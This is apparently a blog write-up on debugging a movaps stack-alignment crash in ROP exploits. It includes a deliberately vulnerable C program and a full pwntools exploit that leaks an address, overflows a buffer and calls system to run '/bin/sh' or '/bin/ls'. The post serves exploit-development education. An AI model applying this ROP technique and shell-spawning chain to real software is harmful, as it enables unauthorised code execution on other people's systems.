---
title: "Debugging a movaps crash"
tags: ["mini", "ROP"]
---

When developing a ROP exploit I kept on crashing on a `movaps xmmword ptr [rsp], xmm0` instruction.

![](/assets/img/2020-10-07-1_movaps_crash.png)

After some investigating I found this was happening because the `movaps` (Move **Aligned** Packed Single-Precision Floating-Point Values) memory operands must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated. In the example above, the stack is not 16 byte aligned hence the crash.

The easiest way to fix our exploit is adding a `ret` gadget to our ROP chain which will act as a NOP, but increment the stack by 8, aligning it.

## Part 2
At some other time I had this simple ROP chain that sets `rdi` to `"/bin/sh"` and calls system from the `plt` of the program. However, even though `system` is called, no shell is popped and no crash happens inside `system`.

```python
ROP = "".join([
    set_rdi(bin_sh_addr),  # rsi = '/bin/sh'
    p64(base + elf.plt['system']),
])
```

Adding a `ret` before the call to `system` (any odd number of `ret`s would work), aligning the stack to 16 bytes, a shell pops. :O
```python
ROP = "".join([
    set_rdi(bin_sh_addr),  # rsi = '/bin/sh'
    p64(base + 0x5d0),     # ret  ---> ['0x5d0', ...]
    p64(base + elf.plt['system']),
])
```

As an example let's use this challenge and exploit to investigate it.
```cpp
#include <stdio.h>
#include <stdlib.h>

int put_system_in_got() {
    system("/bin/ls");
}

int main() {
    printf("'main' leak @ %p\n", main);
    char buf[256];
    printf("buf:");
    scanf("%512s", buf);
}
```

```python
#!/usr/bin/python2
from pwn import *
import sys

FILENAME = "./test"
elf = ELF(FILENAME)

def set_rdi(rdi):
    return "".join([
        p64(elf.address + 0x7d3), # ('pop rdi', 'ret') --> ['0x7d3']
        p64(rdi),
    ])

def go():
    s = process(FILENAME)
    if "wait" in sys.argv:
        raw_input("Enter any key to continue...")

    # ====================
    # leak
    s.recvuntil("'main' leak @ ")
    main_leak = int(s.recvline().strip(), 16)
    elf.address = main_leak - elf.symbols['main']
    print "      elf.address @", hex(elf.address)
    print "elf.plt['system'] @", hex(elf.plt['system'])

    # ====================
    # overflow
    # With a odd amount of ret's between set_rdi and system we see the 'ls'.
    # Otherwise "/bin/ls" does not run
    ROP = "".join([
        set_rdi(next(elf.search("/bin/ls"))),
        # p64(elf.address + 0x762), # ret
        p64(elf.plt['system']),
        p64(0xdeadbeef),
    ])
    payload = "A"*(256+8) + ROP
    s.sendline(payload)
    s.interactive()

go()
```

I started by using [PIN](https://software.intel.com/content/www/us/en/develop/articles/pin-a-dynamic-binary-instrumentation-tool.html) to trace the instructions of this binary when the exploit is successful (with the `ret`) and when it fails, but found no really interesting differences, contrary to what I thought was going to happen. Afterwards I decided to simply `strace` both versions. Nothing too interesting.

At this point I realized the new program (`bin/ls` in this case) is spawning but crashing for some reason. By running `strace -f` to follow the child process we can see big differences. When the exploit fails we see almost no output, meaning the program crashes almost immediatly. Let's confirm with `gdb`. To do this I place a breakpoint in the `clone` syscall inside `system` that spawns the new process and `set follow-fork-mode child` so gdb knows to follow the child. Step 10-20 times and we find our culprit.. `movaps` again!

![](/assets/img/2020-10-05-1_movaps_crash_2.png)
